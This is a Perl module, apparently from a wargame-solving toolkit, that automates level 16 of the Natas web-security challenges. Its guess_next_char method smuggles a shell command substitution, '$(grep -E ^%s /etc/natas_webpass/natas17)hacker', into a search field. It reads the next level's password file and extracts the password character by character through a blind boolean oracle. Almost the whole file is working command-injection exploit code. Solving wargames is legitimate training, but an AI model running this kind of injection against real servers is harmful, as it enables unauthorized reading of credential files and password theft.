package Hack::Natas::16;
use strict;
use warnings;
use v5.16.0;
# VERSION
# ABSTRACT: solve level 16 of the Natas server-side security war games

use Carp qw(confess);
use Moo 1.003000; # RT#82711
with qw(Hack::Natas Hack::Natas::IncrementalSearch);

=head1 DESCRIPTION

This class will solve level 16.

=for Pod::Coverage BUILDARGS

=cut

sub BUILDARGS {
    my %args  = @_[1..$#_];
    return { level => 16, http_pass => $args{http_pass} };
}

=head1 METHODS

=head2 get_password_length

This level has a 32-character password.

=cut

sub get_password_length { 32 }

=head2 response_to_boolean

Does an HTTP GET of the resource described by the key-value
pairs, and then parses the response. If it contains the
string C<hacker>, then return false; otherwise, return true.

=cut

sub response_to_boolean {
    my $self = shift;
    my $res  = $self->get( @_ );

    if (!$res->{success}) {
        use Data::Dumper;
        confess Dumper $res;
    }
    elsif ($res->{content} =~ m/^hacker$/m) {
        return 0;
    }
    else {
        return 1;
    }

}

=head2 guess_next_char

Guesses the next character of the password being extracted. This
method ignores the current position into the password, as the
part of the password extracted thus far is sufficient to continue
the search.

=cut

sub guess_next_char {
    my $self = shift;
    my $inject = '$(grep -E ^%s /etc/natas_webpass/natas17)hacker';

    CHAR:
    foreach my $char ('a'..'z', 'A'..'Z', 0..9) {
        printf "\rGuessing: %s%s", $self->password_so_far, $char;

        if ( $self->response_to_boolean(needle => sprintf($inject, $self->password_so_far . $char)) ) {
            return $char;
        }
        else {
            next CHAR;
        }
    }
    confess sprintf q/Couldn't guess next char; password so far is %s/, $self->password_so_far;
}

1;
